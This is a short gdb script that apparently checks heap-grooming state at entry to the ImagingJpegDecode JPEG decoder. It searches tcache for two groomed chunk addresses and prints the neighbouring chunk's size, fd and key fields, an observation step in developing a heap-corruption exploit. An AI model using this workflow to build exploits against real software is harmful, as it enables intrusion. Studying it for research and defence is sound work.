# W13: at decoder entry, check whether either groomed chunk is still in
# tcache, and whether the chunk at buffer+128 is still live.  gdb observes;
# no memory is staged here.  ASLR is left ON.
set pagination off
set disable-randomization off
set breakpoint pending on
break ImagingJpegDecode
run
set $b=(unsigned char*)state->buffer
set $x=(unsigned long)strtoul(getenv("GROOM_X"),0,16)
set $y=(unsigned long)strtoul(getenv("GROOM_Y"),0,16)
set $tc=(unsigned long*)(((unsigned long)$b & ~(unsigned long)0xffff)+16)
printf "BUF=%p X=%lx Y=%lx TC=%p\n",$b,$x,$y,$tc
set $i=0
while $i < 128
  if $tc[$i] == $x
    printf "FOUND_X off=%d\n",$i*8
  end
  if $tc[$i] == $y
    printf "FOUND_Y off=%d\n",$i*8
  end
  set $i=$i+1
end
printf "NEIGH size=%lx fd=%lx key=%lx\n", *(unsigned long*)($b+136), *(unsigned long*)($b+144), *(unsigned long*)($b+152)
quit
